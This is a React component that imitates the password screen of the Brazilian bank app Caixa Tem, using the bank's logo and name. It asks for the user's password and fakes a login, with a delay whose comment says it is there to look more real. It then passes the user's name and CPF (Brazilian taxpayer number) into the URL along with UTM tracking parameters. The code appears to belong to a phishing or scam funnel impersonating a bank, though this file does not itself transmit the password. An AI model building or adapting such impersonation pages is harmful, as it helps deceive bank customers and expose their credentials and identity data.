import { useState } from 'react';
import { useLocation } from 'wouter';
import { motion } from 'framer-motion';
import { Eye, EyeOff } from 'lucide-react';
import { prepareUrlWithParams } from '../lib/utmHandler';
import caixaLogo from '@assets/caixa logo.webp';
import helpIcon from '@assets/icone-ajuda webp.webp';

export default function LoginSenha() {
  const [, navigate] = useLocation();
  const [senha, setSenha] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');

  const handleSenhaChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setErrorMessage('');
    setSenha(e.target.value);
  };

  const handleBack = () => {
    navigate(prepareUrlWithParams('/login'));
  };

  const handleLogin = async () => {
    if (senha.length < 4) {
      setErrorMessage('Senha deve ter pelo menos 4 caracteres');
      return;
    }

    setLoading(true);
    try {
      // Simulação de login
      const userData = JSON.parse(localStorage.getItem('userData') || '{}');
      const numericCPF = userData.cpf || '';
      const userName = userData.nome || 'Usuario';
      
      // Atraso simulado para parecer mais real
      await new Promise(resolve => setTimeout(resolve, 800));
      
      // Redirecionar para a página principal com nome e CPF
      navigate(prepareUrlWithParams(`/home/${encodeURIComponent(userName)}/${numericCPF}`));
    } catch (error) {
      setErrorMessage('Erro ao fazer login');
      console.error(error);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen w-full flex flex-col bg-white text-[#0079c0]">
      <div className="w-full p-5 flex flex-col items-center">
        {/* Logo CAIXA */}
        <img 
          src={caixaLogo} 
          alt="CAIXA" 
          className="w-40 h-auto" 
        />
        <h2 className="text-[#0079c0] text-xl font-normal mt-1">
          Aplicativo Caixa Tem
        </h2>
      </div>
      
      <div className="flex-1 px-6 flex flex-col">
        <p className="text-[#666666] text-lg font-normal leading-7 mb-6">
          Informe sua senha:
        </p>
        
        {errorMessage && (
          <motion.div
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            className="bg-[#ffe5e5] text-[#cc0000] font-semibold p-3 mb-4 rounded-md text-center"
          >
            {errorMessage}
          </motion.div>
        )}
        
        <div className="relative mb-14">
          <div className="flex items-center">
            <div className="text-[#0079c0] mr-2 w-6 h-6 border-2 border-[#0079c0] rounded p-0.5">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
              </svg>
            </div>
            <span className="text-[#0079c0] font-medium">Senha</span>
          </div>
          <div className="border-b border-[#f7a800] pb-1 mt-1 relative">
            <input
              type={showPassword ? "text" : "password"}
              value={senha}
              onChange={handleSenhaChange}
              placeholder="Senha"
              className="w-full bg-transparent border-0 focus:outline-none text-[#666666] placeholder-[#999999] placeholder-opacity-50 pr-10"
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-0 top-1/2 -translate-y-1/2 text-[#0079c0]"
            >
              {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
            </button>
          </div>
        </div>
        
        {/* Botões */}
        <div className="grid grid-cols-2 gap-4 mb-8">
          <button
            onClick={handleBack}
            className="py-4 border-0 text-[#f7a800] font-medium transition-colors bg-white hover:bg-gray-50"
          >
            Voltar
          </button>
          
          <button
            onClick={handleLogin}
            disabled={loading}
            className="py-4 bg-[#f7a800] hover:bg-[#e59700] text-white font-medium rounded-none transition-colors"
          >
            {loading ? 'Entrando...' : 'Entrar'}
          </button>
        </div>
        
        {/* Recuperar senha */}
        <div className="mb-6 text-center">
          <span className="text-[#0079c0] mr-1">Esqueceu sua senha?</span>
          <a href="#" className="text-[#0079c0] font-medium underline">
            Recuperar Senha
          </a>
        </div>
        
        {/* Link de ajuda */}
        <div className="mt-auto flex justify-center pb-4">
          <a href="#" className="text-[#0079c0] flex items-center">
            <img src={helpIcon} alt="Ajuda" className="w-7 h-7 mr-2" />
            <span className="text-[#0079c0] font-medium">Preciso de ajuda</span>
          </a>
        </div>
      </div>
    </div>
  );
}